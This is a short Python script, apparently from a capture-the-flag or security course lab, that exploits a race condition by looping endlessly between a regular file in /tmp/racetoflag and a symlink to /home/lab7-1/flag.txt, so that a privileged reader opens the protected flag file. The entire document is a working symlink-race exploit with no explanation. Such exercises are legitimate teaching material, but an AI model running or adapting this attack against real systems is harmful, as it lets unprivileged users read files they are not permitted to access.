import os
import time

while True:

	# Create the read target file text.txt
	open("/tmp/racetoflag/text.txt", "w").close()

	# remove the read target file text.txt
	os.remove("/tmp/racetoflag/text.txt")

	# Symlink text.txt to /home/lab7-1/flag.txt
	os.symlink("/home/lab7-1/flag.txt", "/tmp/racetoflag/text.txt")

	# Remove Symlink text.txt
	os.remove("/tmp/racetoflag/text.txt")
